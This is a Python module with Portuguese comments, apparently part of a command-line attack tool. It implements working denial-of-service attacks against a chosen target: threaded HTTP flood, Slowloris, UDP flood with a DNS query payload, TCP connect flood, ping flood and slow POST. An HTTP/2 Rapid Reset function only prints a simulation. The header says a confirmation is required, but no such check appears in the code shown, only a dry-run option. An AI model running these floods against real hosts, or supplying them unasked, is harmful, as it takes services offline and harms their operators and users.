#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Ataques de camada aplicacional (SEM root, SEM amplificação de terceiros).
# Todos exigem confirmação CONFIRMO e suportam dry-run.

import socket
import subprocess
import threading
import time

from core import utils

try:
    import requests
except Exception:
    requests = None


def _params(ctx, indice, txt, padrao):
    """Retorna o valor vindo da CLI ou pede interativamente com padrão."""
    extras = ctx.get("extras") or []
    if len(extras) > indice:
        return extras[indice]
    if utils.is_dry(ctx):
        return str(padrao)  # em dry-run não interrompe com prompts
    try:
        v = input(" {} [{}]: ".format(txt, padrao)).strip()
        return v if v else str(padrao)
    except EOFError:
        return str(padrao)


def http_flood(alvo, ctx):
    """HTTP Flood GET/POST com threads."""
    cfg = ctx["config"]
    threads = int(_params(ctx, 0, "Threads", cfg.get("threads", 20)))
    duracao = int(_params(ctx, 1, "Duracao (s)", cfg.get("duracao_flood", 15)))
    metodo = _params(ctx, 2, "Metodo (GET/POST)", "GET").upper()
    if utils.is_dry(ctx):
        utils.mostrar_dry("http_flood", "{} {} x {}s com {} threads".format(metodo, alvo, duracao, threads))
        return
    if requests is None:
        if utils.instalar_dependencia("requests"):
            globals()["requests"] = __import__("requests")
        else:
            print(utils.c("  Modulo 'requests' indisponivel — http_flood cancelado.", utils.VERMELHO))
            return
    fim = time.time() + duracao
    cont = {"ok": 0, "err": 0}
    trava = threading.Lock()

    def trabalhador():
        while time.time() < fim:
            try:
                if metodo == "POST":
                    requests.post(alvo, data={"flood": "fsataque"}, timeout=5)
                else:
                    requests.get(alvo, timeout=5)
                with trava:
                    cont["ok"] += 1
            except Exception:
                with trava:
                    cont["err"] += 1

    lista = [threading.Thread(target=trabalhador, daemon=True) for _ in range(threads)]
    for t in lista:
        t.start()
        time.sleep(0.05)
    while time.time() < fim:
        time.sleep(5)
        print("  [progresso] ok={} err={} restantes={}s".format(
            cont["ok"], cont["err"], max(0, int(fim - time.time()))))
    for t in lista:
        t.join(timeout=6)
    print("  Finalizado. ok={} err={}".format(cont["ok"], cont["err"]))
    utils.log("http_flood", alvo, "ok={} err={}".format(cont["ok"], cont["err"]))


def slowloris(alvo, ctx):
    """Slowloris: conexões lentas mantidas abertas."""
    cfg = ctx["config"]
    porta = int(_params(ctx, 0, "Porta", 80))
    conexoes = int(_params(ctx, 1, "Conexoes", cfg.get("threads", 20)))
    duracao = int(_params(ctx, 2, "Duracao (s)", cfg.get("duracao_flood", 15)))
    if utils.is_dry(ctx):
        utils.mostrar_dry("slowloris", "{}:{} com {} conexoes x {}s".format(alvo, porta, conexoes, duracao))
        return
    fim = time.time() + duracao
    socks = []

    def abrir():
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((alvo, porta))
            s.send(b"GET / HTTP/1.1\r\nHost: {}\r\n".format(alvo).encode())
            socks.append(s)
        except Exception:
            pass

    for _ in range(conexoes):
        abrir()
    print("  {} conexoes abertas; mantendo...".format(len(socks)))
    while time.time() < fim:
        for s in list(socks):
            try:
                s.send(b"X-a: b\r\n")
            except Exception:
                socks.remove(s)
                abrir()  # repoe conexao que caiu
        time.sleep(10)
    for s in socks:
        try:
            s.close()
        except Exception:
            pass
    print("  Finalizado. conexoes encerradas.")
    utils.log("slowloris", alvo, "{} conexoes x {}s".format(conexoes, duracao))


def udp_flood(alvo, ctx):
    """UDP Flood aplicacional (ex.: consulta DNS) — somente alvo próprio."""
    cfg = ctx["config"]
    porta = int(_params(ctx, 0, "Porta UDP", 53))
    duracao = int(_params(ctx, 1, "Duracao (s)", cfg.get("duracao_flood", 15)))
    if utils.is_dry(ctx):
        utils.mostrar_dry("udp_flood", "pacotes UDP para {}:{} x {}s".format(alvo, porta, duracao))
        return
    # Payload: consulta DNS simples (aplicacional)
    payload = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01"
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    fim = time.time() + duracao
    contador = 0
    while time.time() < fim:
        try:
            s.sendto(payload, (alvo, porta))
            contador += 1
        except Exception:
            pass
        if contador % 500 == 0:
            time.sleep(0.01)
    s.close()
    print("  Finalizado. pacotes enviados: {}".format(contador))
    utils.log("udp_flood", alvo, "{} pacotes UDP:{}".format(contador, porta))


def tcp_connect(alvo, ctx):
    """TCP SYN flood 'lógico' usando connect() comum (sem raw sockets)."""
    cfg = ctx["config"]
    porta = int(_params(ctx, 0, "Porta", 80))
    duracao = int(_params(ctx, 1, "Duracao (s)", cfg.get("duracao_flood", 15)))
    if utils.is_dry(ctx):
        utils.mostrar_dry("tcp_connect", "connect() em {}:{} x {}s".format(alvo, porta, duracao))
        return
    fim = time.time() + duracao
    contador = {"n": 0}
    trava = threading.Lock()

    def trabalhador():
        while time.time() < fim:
            s = socket.socket()
            s.settimeout(3)
            try:
                s.connect((alvo, porta))
                with trava:
                    contador["n"] += 1
            except Exception:
                pass
            finally:
                s.close()

    threads = [threading.Thread(target=trabalhador, daemon=True) for _ in range(min(50, cfg.get("threads", 20)))]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=duracao + 5)
    print("  Finalizado. conexoes concluidas: {}".format(contador["n"]))
    utils.log("tcp_connect", alvo, "{} connect em :{}".format(contador["n"], porta))


def icmp_flood(alvo, ctx):
    """ICMP Flood via ping em loop (limitado, sem raw sockets)."""
    cfg = ctx["config"]
    duracao = int(_params(ctx, 0, "Duracao (s)", cfg.get("duracao_flood", 15)))
    if utils.is_dry(ctx):
        utils.mostrar_dry("icmp_flood", "ping -c 1 em {} por {}s".format(alvo, duracao))
        return
    fim = time.time() + duracao
    contador = 0
    while time.time() < fim:
        try:
            sistema = "win" if __import__("os").name == "nt" else "posix"
            cmd = ["ping", "-n", "1", "-w", "1000", alvo] if sistema == "win" else ["ping", "-c", "1", "-W", "1", alvo]
            subprocess.run(cmd, capture_output=True, timeout=3)
            contador += 1
        except Exception:
            pass
    print("  Finalizado. pings enviados: {}".format(contador))
    utils.log("icmp_flood", alvo, "{} pings".format(contador))


def slow_post(alvo, ctx):
    """Slow POST (R-U-Dead-Yet): envia body devagar com Content-Length alto."""
    cfg = ctx["config"]
    porta = int(_params(ctx, 0, "Porta", 80))
    duracao = int(_params(ctx, 1, "Duracao (s)", cfg.get("duracao_flood", 15)))
    if utils.is_dry(ctx):
        utils.mostrar_dry("slow_post", "POST lento em {}:{} x {}s".format(alvo, porta, duracao))
        return
    fim = time.time() + duracao
    socks = []

    def abrir():
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((alvo, porta))
            cab = ("POST / HTTP/1.1\r\nHost: {}\r\nContent-Type: application/x-www-form-urlencoded\r\n"
                   "Content-Length: 100000\r\nConnection: keep-alive\r\n\r\n").format(alvo)
            s.send(cab.encode())
            socks.append(s)
        except Exception:
            pass

    for _ in range(10):
        abrir()
    while time.time() < fim:
        for s in list(socks):
            try:
                s.send(b"a=1&")  # dribla o corpo lentamente
            except Exception:
                socks.remove(s)
                abrir()
        time.sleep(15)
    for s in socks:
        try:
            s.close()
        except Exception:
            pass
    print("  Finalizado.")
    utils.log("slow_post", alvo, "{} conexoes x {}s".format(len(socks), duracao))


def http2_rapid(alvo, ctx):
    """HTTP/2 Rapid Reset — MODO SIMULACAO (sem envio real de frames)."""
    duracao = int(_params(ctx, 0, "Duracao (s)", 10))
    if utils.is_dry(ctx):
        utils.mostrar_dry("http2_rapid", "simulacao de resets em {}".format(alvo))
        return
    # Simulação explicativa: o frame real exigiria a lib 'h2' + TLS + alvo HTTP/2
    print(utils.c("  SIMULACAO: nenhum pacote sera enviado.", utils.AMARELO))
    print("  O ataque real enviaria milhoes de streams RST (GET + CANCEL) em HTTP/2.")
    print("  Nesta CLI ele e apenas didatico por exigir force bruta de largura de banda.")
    fim = time.time() + min(duracao, 10)
    contador = 0
    while time.time() < fim:
        contador += 1000
        print("  [simulacao] streams falsos: {}".format(contador))
        time.sleep(1)
    utils.log("http2_rapid", alvo, "simulacao concluida ({} streams ficticios)".format(contador))
